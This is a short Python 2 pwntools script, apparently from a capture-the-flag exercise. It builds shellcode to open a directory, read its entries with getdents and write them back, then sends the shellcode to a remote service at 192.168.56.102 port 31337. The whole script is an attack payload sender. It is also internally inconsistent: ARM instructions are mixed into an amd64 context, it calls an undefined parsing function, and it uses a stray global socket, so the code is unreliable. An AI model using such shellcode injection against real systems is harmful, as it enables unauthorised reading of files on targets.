#!python

from pwn import *

context('amd64', 'linux')
#from scgen_v2 import *

__LAST_UPDATED__ = '2014. 05. 11. rev.0'

def parser(rv):
    i = 0
    fn= []
    while 1:
        inode = rv[i:i+4]
        off   = rv[i+4:i+8]
        st_size = u16(rv[i+8:i+10])
        fname   = rv[i+10:i+st_size]
        if st_size == 0:
            break
        fn.append(fname.split('\x00')[0]) 
        i = i + st_size
    print fn

def Get_scode(*args):
    sock  = args[0]
    scode = args[1]
    arg   = args[2:]
    log.info('Shellcode: %s' % (scode))
    if scode == 'getdents':
        sc = ''
        sc += asm(shellcode.open_file(arg[0]))
        sc += asm(shellcode.getdents(in_fd=3))
        sc += asm(shellcode.write_stack(out_fd=4, size=255))
        sock.send(sc + '\n')
        #print sock.recvall()
        #Readall(sock, handler=parser)
    elif scode == 'ls':
        in_fd = 3
        out_fd = 4
        sc = ''
        sc += shellcode.ls(filepath=arg[0], in_fd=in_fd, out_fd=out_fd)
        sc += asm('mov r0, #%s' % str(in_fd))
        sc += asm('svc SYS_close')
        sc += asm('sub r0, r0, r0')
        sc += asm('svc SYS_exit')
        sock.send(sc + '\n')

        rv = ''
        while True:
            try:
                rv += s.recv(1)
            except:
                break
            if len(rv) == 0: break
            if len(rv) == 255:
                print Get_parse_getdents(rv)
                rv = ''
        if len(rv) != 0:
            print Get_parse_getdents(rv)

if __name__ == '__main__':
    s = remote('192.168.56.102', 31337)
    Get_scode(s, 'getdents', '.')
